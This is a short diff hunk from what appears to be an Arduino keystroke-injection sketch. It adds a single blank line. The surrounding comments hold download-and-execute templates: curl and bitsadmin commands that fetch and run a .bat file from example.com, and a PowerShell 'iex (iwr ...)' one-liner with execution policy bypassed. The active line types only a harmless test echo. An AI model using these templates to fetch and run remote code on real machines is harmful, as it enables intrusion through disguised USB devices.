@@ -25,6 +25,7 @@ void setup() {
     // For bat files use:
     // cmd /c "curl -o %temp%\x.bat http://example.com/x.bat & %temp%\x.bat"
     // cmd /c "bitsadmin /transfer job /download /priority high https://example.com/file.bat %userprofile%\x.bat && %userprofile%\x.bat"
+    
     // For powershell (compatible with older versions):
     // powershell -exec bypass -c "iex (iwr http://example.com/script.ps1)"
     Keyboard.print("echo Arduino test > %USERPROFILE%\\Downloads\\arduino_test.txt && exit");
